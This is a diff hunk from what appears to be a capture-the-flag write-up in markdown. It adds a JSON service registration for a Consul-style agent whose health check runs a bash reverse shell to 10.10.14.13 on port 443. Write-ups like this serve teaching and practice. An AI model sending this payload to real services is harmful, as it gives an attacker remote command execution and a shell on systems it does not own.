@@ -812,7 +812,18 @@ We copy the structure of the json data into the exploit and create our own json 
 <br />
 
 ```json
-
+{
+"ID": "TheBest",
+"Name": "pwn",
+"Address": "127.0.0.1",
+"Port": 80,
+"Check": {
+	"DeregisterCriticalServiceAfter": "90m",
+	"Args":[ "/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.13/443 0>&1" ],
+     	"Interval": "10s",
+      	"Timeout": "86400s"
+}
+}
 ```
 
 <br />
